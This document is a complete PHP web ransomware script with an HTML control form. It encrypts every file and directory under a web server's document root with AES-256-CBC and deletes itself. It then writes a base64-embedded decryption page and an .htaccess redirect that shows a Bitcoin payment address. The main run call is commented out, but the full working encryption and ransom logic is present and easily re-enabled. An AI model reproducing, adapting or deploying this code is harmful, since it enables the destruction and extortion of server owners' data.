<?php
error_reporting(0);
set_time_limit(0);
class Ransomware {
    private $root = '';
    private $salt = '';
    private $cryptoKey = '';
    private $cryptoKeyLength = '32';
    private $iterations = '10000';
    private $algorithm = 'SHA512';
    private $iv = '';
    private $cipher = 'AES-256-CBC';
    private $extension = 'ransom';
    public function __construct($key) {
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->salt = openssl_random_pseudo_bytes(10);
        $this->cryptoKey = openssl_pbkdf2($key, $this->salt, $this->cryptoKeyLength, $this->iterations, $this->algorithm);
        $this->iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($this->cipher));
    }
    private function generateRandomFile($directory, $extension) {
        $randomName = '';
        do {
            $randomName = str_replace(array('+', '/', '='), '', base64_encode(openssl_random_pseudo_bytes(6)));
            $randomName = $directory . '/' . $randomName . '.' . $extension;
        } while (file_exists($randomName));
        return $randomName;
    }
    private function createDecryptionFile($directory) {
        // decryption file encoded in Base64
        $data = base64_decode('PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCnNldF90aW1lX2xpbWl0KDApOw0KY2xhc3MgUmFuc29td2FyZSB7DQogICAgcHJpdmF0ZSAkcm9vdCA9ICc8cm9vdD4nOw0KICAgIHByaXZhdGUgJHNhbHQgPSAnJzsNCiAgICBwcml2YXRlICRjcnlwdG9LZXkgPSAnJzsNCiAgICBwcml2YXRlICRjcnlwdG9LZXlMZW5ndGggPSAnPGNyeXB0b0tleUxlbmd0aD4nOw0KICAgIHByaXZhdGUgJGl0ZXJhdGlvbnMgPSAnPGl0ZXJhdGlvbnM+JzsNCiAgICBwcml2YXRlICRhbGdvcml0aG0gPSAnPGFsZ29yaXRobT4nOw0KICAgIHByaXZhdGUgJGl2ID0gJyc7DQogICAgcHJpdmF0ZSAkY2lwaGVyID0gJzxjaXBoZXI+JzsNCiAgICBwcml2YXRlICRleHRlbnNpb24gPSAnPGV4dGVuc2lvbj4nOw0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgka2V5KSB7DQogICAgICAgICR0aGlzLT5zYWx0ID0gYmFzZTY0X2RlY29kZSgnPHNhbHQ+Jyk7DQogICAgICAgICR0aGlzLT5jcnlwdG9LZXkgPSBvcGVuc3NsX3Bia2RmMigka2V5LCAkdGhpcy0+c2FsdCwgJHRoaXMtPmNyeXB0b0tleUxlbmd0aCwgJHRoaXMtPml0ZXJhdGlvbnMsICR0aGlzLT5hbGdvcml0aG0pOw0KICAgICAgICAkdGhpcy0+aXYgPSBiYXNlNjRfZGVjb2RlKCc8aXY+Jyk7DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gZGVsZXRlRGVjcnlwdGlvbkZpbGUoJGRpcmVjdG9yeSkgew0KICAgICAgICB1bmxpbmsoJGRpcmVjdG9yeSAuICcvLmh0YWNjZXNzJyk7DQogICAgICAgIHVubGluaygkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGRlY3J5cHROYW1lKCRwYXRoKSB7DQogICAgICAgICRkZWNyeXB0ZWROYW1lID0gb3BlbnNzbF9kZWNyeXB0KHVybGRlY29kZShwYXRoaW5mbygkcGF0aCwgUEFUSElORk9fRklMRU5BTUUpKSwgJHRoaXMtPmNpcGhlciwgJHRoaXMtPmNyeXB0b0tleSwgMCwgJHRoaXMtPml2KTsNCiAgICAgICAgJGRlY3J5cHRlZE5hbWUgPSAkZGVjcnlwdGVkTmFtZSAhPT0gZmFsc2UgPyBzdWJzdHIoJHBhdGgsIDAsIHN0cnJpcG9zKCRwYXRoLCAnLycpICsgMSkgLiAkZGVjcnlwdGVkTmFtZSA6ICRkZWNyeXB0ZWROYW1lOw0KICAgICAgICByZXR1cm4gJGRlY3J5cHRlZE5hbWU7DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gZGVjcnlwdERpcmVjdG9yeSgkZW5jcnlwdGVkRGlyZWN0b3J5KSB7DQogICAgICAgIGlmIChwYXRoaW5mbygkZW5jcnlwdGVkRGlyZWN0b3J5LCBQQVRISU5GT19FWFRFTlNJT04pID09PSAkdGhpcy0+ZXh0ZW5zaW9uKSB7DQogICAgICAgICAgICAkZGlyZWN0b3J5ID0gJHRoaXMtPmRlY3J5cHROYW1lKCRlbmNyeXB0ZWREaXJlY3RvcnkpOw0KICAgICAgICAgICAgaWYgKCRkaXJlY3RvcnkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgcmVuYW1lKCRlbmNyeXB0ZWREaXJlY3RvcnksICRkaXJlY3RvcnkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gZGVjcnlwdEZpbGUoJGVuY3J5cHRlZEZpbGUpIHsNCiAgICAgICAgaWYgKHBhdGhpbmZvKCRlbmNyeXB0ZWRGaWxlLCBQQVRISU5GT19FWFRFTlNJT04pID09PSAkdGhpcy0+ZXh0ZW5zaW9uKSB7DQogICAgICAgICAgICAkZGF0YSA9IG9wZW5zc2xfZGVjcnlwdChmaWxlX2dldF9jb250ZW50cygkZW5jcnlwdGVkRmlsZSksICR0aGlzLT5jaXBoZXIsICR0aGlzLT5jcnlwdG9LZXksIDAsICR0aGlzLT5pdik7DQogICAgICAgICAgICBpZiAoJGRhdGEgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgJGZpbGUgPSAkdGhpcy0+ZGVjcnlwdE5hbWUoJGVuY3J5cHRlZEZpbGUpOw0KICAgICAgICAgICAgICAgIGlmICgkZmlsZSAhPT0gZmFsc2UgJiYgcmVuYW1lKCRlbmNyeXB0ZWRGaWxlLCAkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCFmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGRhdGEsIExPQ0tfRVgpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZW5hbWUoJGZpbGUsICRlbmNyeXB0ZWRGaWxlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIHNjYW4oJGRpcmVjdG9yeSkgew0KICAgICAgICAkZmlsZXMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJGRpcmVjdG9yeSksIGFycmF5KCcuJywgJy4uJykpOw0KICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHsNCiAgICAgICAgICAgIGlmIChpc19kaXIoJGRpcmVjdG9yeSAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5zY2FuKCRkaXJlY3RvcnkgLiAnLycgLiAkZmlsZSk7DQogICAgICAgICAgICAgICAgJHRoaXMtPmRlY3J5cHREaXJlY3RvcnkoJGRpcmVjdG9yeSAuICcvJyAuICRmaWxlKTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPmRlY3J5cHRGaWxlKCRkaXJlY3RvcnkgLiAnLycgLiAkZmlsZSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHJ1bigpIHsNCiAgICAgICAgJHRoaXMtPmRlbGV0ZURlY3J5cHRpb25GaWxlKCR0aGlzLT5yb290KTsNCiAgICAgICAgaWYgKCR0aGlzLT5jcnlwdG9LZXkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAkdGhpcy0+c2NhbigkdGhpcy0+cm9vdCk7DQogICAgICAgIH0NCiAgICB9DQp9DQokZXJyb3JNZXNzYWdlcyA9IGFycmF5KA0KICAgICdrZXknID0+ICcnDQopOw0KaWYgKGlzc2V0KCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddKSAmJiBzdHJ0b2xvd2VyKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddKSA9PT0gJ3Bvc3QnKSB7DQogICAgaWYgKGlzc2V0KCRfUE9TVFsna2V5J10pKSB7DQogICAgICAgICRwYXJhbWV0ZXJzID0gYXJyYXkoDQogICAgICAgICAgICAna2V5JyA9PiAkX1BPU1RbJ2tleSddDQogICAgICAgICk7DQogICAgICAgIG1iX2ludGVybmFsX2VuY29kaW5nKCdVVEYtOCcpOw0KICAgICAgICAkZXJyb3IgPSBmYWxzZTsNCiAgICAgICAgaWYgKG1iX3N0cmxlbigkcGFyYW1ldGVyc1sna2V5J10pIDwgMSkgew0KICAgICAgICAgICAgJGVycm9yTWVzc2FnZXNbJ2tleSddID0gJ1BsZWFzZSBlbnRlciBkZWNyeXB0aW9uIGtleSc7DQogICAgICAgICAgICAkZXJyb3IgPSB0cnVlOw0KICAgICAgICB9DQogICAgICAgIGlmICghJGVycm9yKSB7DQogICAgICAgICAgICAkcmFuc29td2FyZSA9IG5ldyBSYW5zb213YXJlKCRwYXJhbWV0ZXJzWydrZXknXSk7DQogICAgICAgICAgICAkcmFuc29td2FyZS0+cnVuKCk7DQogICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvJyk7DQogICAgICAgICAgICBleGl0KCk7DQogICAgICAgIH0NCiAgICB9DQp9DQokaW1nID0gJ2lWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFKWUFBQUNXQ0FJQUFBQ3pZK2ExQUFBQUJtSkxSMFFBL3dEL0FQK2d2YWVUQUFBRFlrbEVRVlI0bk8yZHkyN2pNQXdBblVYLy81ZlR3eFk1Q0k0Z2hhVGtjV1l1QzJ6OGFnZEVXSW1rSDgvbjh4QXkvM1kvZ0VUNStmL1A0L0ZZYzcrcG9HK2VxamwzMmFkOUl1ZEdlTjNYS01TalFqd3F4S05DUEQrbi81djRsMGIvNjcyZlZ2U3B5NHdpTjBvOHQrSGRReHFGZUZTSVI0VjRWSWpuUEoxcGlLeFdSQTd1ZjlyUFVDS1AwVnc1TWRtcCtFMGFoWGhVaUVlRmVGU0laeWlkcVNQeDYzMHE2WWhrS011Mmt3WXhDdkdvRUk4SzhhZ1F6K1owWnFxa3BYOXVBNkwrSlFXakVJOEs4YWdRandyeERLVXpkVVg3VTRuRDFKSktZb2FTK09OWC9DYU5RandxeEtOQ1BDckVjNTdPN0ZxZVNPdy9TdXhkbXJweS8rQUtqRUk4S3NTalFqd3F4UE80MUxpRXVsS2F5SzdXeFRFSzhhZ1Fqd3J4cUJCUC90eVp1bDJleE9XWVhXTm9Fajk5WVJUaVVTRWVGZUpSSVo2aDFabGxuY3E3QnVWRitwN3FKdG9Nbm1zVTRsRWhIaFhpVVNHZVQwcUJwMVpKNmxoV1NqUFZZSlZZV2VQY21XOUJoWGhVaUVlRmVJWTJteEluNHkycmpwbTZiK0lZdmNRUndtNDJmUXNxeEtOQ1BDckU4NWZPMURYK0pKNmJ1S3UxYTg4cmNxTjNHSVY0VkloSGhYaFVpT2V2ZG1aQmljZkl3VlAzM2ZVWWRTM2duOTNYS01TalFqd3F4S05DUE9mcHpMSXY4R1hEN3E3WnQyM3RqQnlIQ20rQUN2R29FRS81R0wyNnVwdkltbEhkRGxIaXdZTVloWGhVaUVlRmVGU0laNmgySnJKYVViY0gxTDlSWktPcUxxdXFxSk0yQ3ZHb0VJOEs4YWdRejNsbkUySVBhTmZzdXdnVlZ6WUs4YWdRandyeHFCQlBRdTFNZThXQy9aUTRkVDlnNHRLVm0wMWZpZ3J4cUJDUEN2RU1qZEZybVBvU3ZzZzQzc1JQNjNLOXFZUGRiTG9QS3NTalFqd3F4Sk0vRmJoaFdkUFFzcjJucWNkSXZKRmo5RzZMQ3ZHb0VJOEs4V3grbzNaZC8zVGkvdEd5NFg1VHVEcHpIMVNJUjRWNFZJZ24vNDNhZlJLN3F4T3Z2S3ZCeXFuQWNod3F2QUVxeEtOQ1BPZWJUWFc5UFAwYkpjNE0zalhycis2ZFRlOE9OZ3J4cUJDUEN2R29FTTlRN2N5eU54TWsxdEUyMURVcjdYcS8xUXVqRUk4SzhhZ1Fqd3J4Zk5MWlZFZWtwYWdoY1VsbDJWdkFQOHR1akVJOEtzU2pRandxeEhPdGRLWWhrdDBzMnhKcXFLdENzclBwdHFnUWp3cnhxQkRQSjQzYXk2aXI3bzBVN1BaWjN5QnVGT0pSSVI0VjRsRWhudkpYVUM1ajE3Q1kvcVVXTENFWmhYaFVpRWVGZUZTSVovUGNHWWxqRk9KUklaNWZlZ3RUVUFYcFZoVUFBQUFBU1VWT1JLNUNZSUk9JzsNCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCgk8aGVhZD4NCgkJPG1ldGEgY2hhcnNldD0iVVRGLTgiPg0KCQk8dGl0bGU+UmFuc29td2FyZTwvdGl0bGU+DQoJCTxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJSYW5zb213YXJlIHdyaXR0ZW4gaW4gUEhQLiI+DQoJCTxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJIVE1MLCBDU1MsIFBIUCwgcmFuc29td2FyZSI+DQoJCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iSXZhbiDFoGluY2VrIj4NCgkJPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KCQk8c3R5bGU+DQoJCQlodG1sIHsNCgkJCQloZWlnaHQ6IDEwMCU7DQoJCQl9DQoJCQlib2R5IHsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjMjYyNjI2Ow0KCQkJCWRpc3BsYXk6IGZsZXg7DQoJCQkJZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCgkJCQltYXJnaW46IDA7DQoJCQkJaGVpZ2h0OiBpbmhlcml0Ow0KCQkJCWNvbG9yOiAjRjhGOEY4Ow0KCQkJCWZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOw0KCQkJCWZvbnQtc2l6ZTogMWVtOw0KCQkJCWZvbnQtd2VpZ2h0OiA0MDA7DQoJCQkJdGV4dC1hbGlnbjogbGVmdDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIHsNCgkJCQlkaXNwbGF5OiBmbGV4Ow0KCQkJCWZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQoJCQkJYWxpZ24taXRlbXM6IGNlbnRlcjsNCgkJCQlqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCgkJCQlmbGV4OiAxIDAgYXV0bzsNCgkJCQlwYWRkaW5nOiAwLjVlbTsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICNEQ0RDREM7DQoJCQkJcGFkZGluZzogMS41ZW07DQoJCQkJd2lkdGg6IDIxZW07DQoJCQkJY29sb3I6ICMwMDA7DQoJCQkJYm9yZGVyOiAwLjA3ZW0gc29saWQgIzAwMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgaGVhZGVyIHsNCgkJCQl0ZXh0LWFsaWduOiBjZW50ZXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGhlYWRlciAudGl0bGUgew0KCQkJCW1hcmdpbjogMDsNCgkJCQlmb250LXNpemU6IDIuNmVtOw0KCQkJCWZvbnQtd2VpZ2h0OiA0MDA7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IC5hYm91dCB7DQoJCQkJdGV4dC1hbGlnbjogY2VudGVyOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWJvdXQgcCB7DQoJCQkJbWFyZ2luOiAxZW0gMDsNCgkJCQljb2xvcjogIzJGNEY0RjsNCgkJCQlmb250LXdlaWdodDogNjAwOw0KCQkJCXdvcmQtd3JhcDogYnJlYWstd29yZDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFib3V0IGltZyB7DQoJCQkJYm9yZGVyOiAwLjA3ZW0gc29saWQgIzAwMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSB7DQoJCQkJZGlzcGxheTogZmxleDsNCgkJCQlmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KCQkJCW1hcmdpbi10b3A6IDFlbTsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSBpbnB1dCB7DQoJCQkJLXdlYmtpdC1hcHBlYXJhbmNlOiBub25lOw0KCQkJCS1tb3otYXBwZWFyYW5jZTogbm9uZTsNCgkJCQlhcHBlYXJhbmNlOiBub25lOw0KCQkJCW1hcmdpbjogMDsNCgkJCQlwYWRkaW5nOiAwLjJlbSAwLjRlbTsNCgkJCQlmb250LWZhbWlseTogQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZjsNCgkJCQlmb250LXNpemU6IDFlbTsNCgkJCQlib3JkZXI6IDAuMDdlbSBzb2xpZCAjOUQyQTAwOw0KCQkJCS13ZWJraXQtYm9yZGVyLXJhZGl1czogMDsNCgkJCQktbW96LWJvcmRlci1yYWRpdXM6IDA7DQoJCQkJYm9yZGVyLXJhZGl1czogMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSBpbnB1dFt0eXBlPSJzdWJtaXQiXSB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogI0ZGNDUwMDsNCgkJCQljb2xvcjogI0Y4RjhGODsNCgkJCQljdXJzb3I6IHBvaW50ZXI7DQoJCQkJdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAyMjBtcyBsaW5lYXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gaW5wdXRbdHlwZT0ic3VibWl0Il06aG92ZXIgew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICNEODNBMDA7DQoJCQkJdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAyMjBtcyBsaW5lYXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gLmVycm9yIHsNCgkJCQltYXJnaW46IDAgMCAxZW0gMDsNCgkJCQljb2xvcjogIzlEMkEwMDsNCgkJCQlmb250LXNpemU6IDAuOGVtOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIC5lcnJvcjpub3QoOmVtcHR5KSB7DQoJCQkJbWFyZ2luOiAwLjJlbSAwIDFlbSAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIGxhYmVsIHsNCgkJCQltYXJnaW4tYm90dG9tOiAwLjJlbTsNCgkJCQloZWlnaHQ6IDEuMmVtOw0KCQkJfQ0KCQkJQG1lZGlhIHNjcmVlbiBhbmQgKG1heC13aWR0aDogNDgwcHgpIHsNCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0IHsNCgkJCQkJd2lkdGg6IDE1LjVlbTsNCgkJCQl9DQoJCQl9DQoJCQlAbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOiAzMjBweCkgew0KCQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgew0KCQkJCQl3aWR0aDogMTQuNWVtOw0KCQkJCX0NCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGhlYWRlciAudGl0bGUgew0KCQkJCQlmb250LXNpemU6IDIuNGVtOw0KCQkJCX0NCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0IC5hYm91dCBwIHsNCgkJCQkJZm9udC1zaXplOiAwLjllbTsNCgkJCQl9DQoJCQl9DQoJCTwvc3R5bGU+DQoJPC9oZWFkPg0KCTxib2R5Pg0KCQk8ZGl2IGNsYXNzPSJmcm9udC1mb3JtIj4NCgkJCTxkaXYgY2xhc3M9ImxheW91dCI+DQoJCQkJPGhlYWRlcj4NCgkJCQkJPGgxIGNsYXNzPSJ0aXRsZSI+UmFuc29td2FyZTwvaDE+DQoJCQkJPC9oZWFkZXI+DQoJCQkJPGRpdiBjbGFzcz0iYWJvdXQiPg0KCQkJCQk8cD5NYWRlIGJ5IEl2YW4gxaBpbmNlay48L3A+DQoJCQkJCTxwPkkgaG9wZSB5b3UgbGlrZSBpdCE8L3A+DQoJCQkJCTxwPkZlZWwgZnJlZSB0byBkb25hdGUgYml0Y29pbi48L3A+DQoJCQkJCTxpbWcgc3JjPSJkYXRhOmltYWdlL2dpZjtiYXNlNjQsPD9waHAgZWNobyAkaW1nOyA/PiIgYWx0PSJCaXRjb2luIFdhbGxldCI+DQoJCQkJCTxwPjFCclpNNlQ3RzlSTjh2YmFibmZYdTRNNkxwZ3p0cTZZMTQ8L3A+DQoJCQkJPC9kaXY+DQoJCQkJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ijw/cGhwIGVjaG8gJy4vJyAuIHBhdGhpbmZvKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSwgUEFUSElORk9fQkFTRU5BTUUpOyA/PiI+DQoJCQkJCTxsYWJlbCBmb3I9ImtleSI+RGVjcnlwdGlvbiBLZXk8L2xhYmVsPg0KCQkJCQk8aW5wdXQgbmFtZT0ia2V5IiBpZD0ia2V5IiB0eXBlPSJ0ZXh0IiBzcGVsbGNoZWNrPSJmYWxzZSIgYXV0b2ZvY3VzPSJhdXRvZm9jdXMiPg0KCQkJCQk8cCBjbGFzcz0iZXJyb3IiPjw/cGhwIGVjaG8gJGVycm9yTWVzc2FnZXNbJ2tleSddOyA/PjwvcD4NCgkJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkRlY3J5cHQiPg0KCQkJCTwvZm9ybT4NCgkJCTwvZGl2Pg0KCQk8L2Rpdj4NCgk8L2JvZHk+DQo8L2h0bWw+DQo=');
        $data = str_replace(
            array(
                '<root>',
                '<salt>',
                '<cryptoKeyLength>',
                '<iterations>',
                '<algorithm>',
                '<iv>',
                '<cipher>',
                '<extension>'
            ),
            array(
                $this->root,
                base64_encode($this->salt),
                $this->cryptoKeyLength,
                $this->iterations,
                $this->algorithm,
                base64_encode($this->iv),
                $this->cipher,
                $this->extension
            ),
            $data
        );
        $decryptionFile = $this->generateRandomFile($directory, 'php');
        file_put_contents($decryptionFile, $data, LOCK_EX);
        $decryptionFile = pathinfo($decryptionFile, PATHINFO_BASENAME);
        file_put_contents($directory . '/.htaccess', "DirectoryIndex /{$decryptionFile}\nErrorDocument 400 /{$decryptionFile}\nErrorDocument 401 /{$decryptionFile}\nErrorDocument 403 /{$decryptionFile}\nErrorDocument 404 /{$decryptionFile}\nErrorDocument 500 /{$decryptionFile}\n", LOCK_EX);
    }
    private function encryptName($path) {
        $encryptedName = '';
        do {
            $encryptedName = openssl_encrypt(pathinfo($path, PATHINFO_BASENAME), $this->cipher, $this->cryptoKey, 0, $this->iv);
            $encryptedName = $encryptedName !== false ? substr($path, 0, strripos($path, '/') + 1) . urlencode($encryptedName) . '.' . $this->extension : $encryptedName;
        } while ($encryptedName !== false && file_exists($encryptedName));
        return $encryptedName;
    }
    private function encryptDirectory($directory) {
        $encryptedDirectory = $this->encryptName($directory);
        if ($encryptedDirectory !== false) {
            rename($directory, $encryptedDirectory);
        }
    }
    private function encryptFile($file) {
        $encryptedData = openssl_encrypt(file_get_contents($file), $this->cipher, $this->cryptoKey, 0, $this->iv);
        if ($encryptedData !== false) {
            $encryptedFile = $this->encryptName($file);
            if ($encryptedFile !== false && rename($file, $encryptedFile)) {
                if (!file_put_contents($encryptedFile, $encryptedData, LOCK_EX)) {
                    rename($encryptedFile, $file);
                }
            }
        }
    }
    private function scan($directory) {
        $files = array_diff(scandir($directory), array('.', '..'));
        foreach ($files as $file) {
            if (is_dir($directory . '/' . $file)) {
                $this->scan($directory . '/' . $file);
                $this->encryptDirectory($directory . '/' . $file);
            } else {
                $this->encryptFile($directory . '/' . $file);
            }
        }
    }
    public function run() {
        unlink($_SERVER['SCRIPT_FILENAME']);
        if ($this->cryptoKey !== false) {
            $this->scan($this->root);
            $this->createDecryptionFile($this->root);
        }
    }
}
$errorMessages = array(
    'key' => ''
);
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
    if (isset($_POST['key'])) {
        $parameters = array(
            'key' => $_POST['key']
        );
        mb_internal_encoding('UTF-8');
        $error = false;
        if (mb_strlen($parameters['key']) < 1) {
            $errorMessages['key'] = 'Please enter encryption key';
            $error = true;
        }
        if (!$error) {
            $ransomware = new Ransomware($parameters['key']);
            // $ransomware->run();
            header('Location: /');
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Ransomware</title>
		<meta name="description" content="Ransomware written in PHP.">
		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<style>
			html {
				height: 100%;
			}
			body {
				background-color: #262626;
				display: flex;
				flex-direction: column;
				margin: 0;
				height: inherit;
				color: #F8F8F8;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				font-weight: 400;
				text-align: left;
			}
			.front-form {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				flex: 1 0 auto;
				padding: 0.5em;
			}
			.front-form .layout {
				background-color: #DCDCDC;
				padding: 1.5em;
				width: 21em;
				color: #000;
				border: 0.07em solid #000;
			}
			.front-form .layout header {
				text-align: center;
			}
			.front-form .layout header .title {
				margin: 0;
				font-size: 2.6em;
				font-weight: 400;
			}
			.front-form .layout header p {
				margin: 0;
				font-size: 1.2em;
			}
			.front-form .layout .advice p {
				margin: 1em 0 0 0;
			}
			.front-form .layout form {
				display: flex;
				flex-direction: column;
				margin-top: 1em;
			}
			.front-form .layout form input {
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none;
				margin: 0;
				padding: 0.2em 0.4em;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				border: 0.07em solid #9D2A00;
				-webkit-border-radius: 0;
				-moz-border-radius: 0;
				border-radius: 0;
			}
			.front-form .layout form input[type="submit"] {
				background-color: #FF4500;
				color: #F8F8F8;
				cursor: pointer;
				transition: background-color 220ms linear;
			}
			.front-form .layout form input[type="submit"]:hover {
				background-color: #D83A00;
				transition: background-color 220ms linear;
			}
			.front-form .layout form .error {
				margin: 0 0 1em 0;
				color: #9D2A00;
				font-size: 0.8em;
			}
			.front-form .layout form .error:not(:empty) {
				margin: 0.2em 0 1em 0;
			}
			.front-form .layout form label {
				margin-bottom: 0.2em;
				height: 1.2em;
			}
			@media screen and (max-width: 480px) {
				.front-form .layout {
					width: 15.5em;
				}
			}
			@media screen and (max-width: 320px) {
				.front-form .layout {
					width: 14.5em;
				}
				.front-form .layout header .title {
					font-size: 2.4em;
				}
				.front-form .layout header p {
					font-size: 1.1em;
				}
				.front-form .layout .advice p {
					font-size: 0.9em;
				}
			}
		</style>
	</head>
	<body>
		<div class="front-form">
			<div class="layout">
				<header>
					<h1 class="title">Ransomware</h1>
					<p>Made by Ivan Šincek</p>
				</header>
				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
					<label for="key">Encryption Key</label>
					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">
					<p class="error"><?php echo $errorMessages['key']; ?></p>
					<input type="submit" value="Encrypt">
				</form>
				<div class="advice">
					<p>Backup your server files!</p>
				</div>
			</div>
		</div>
	</body>
</html>
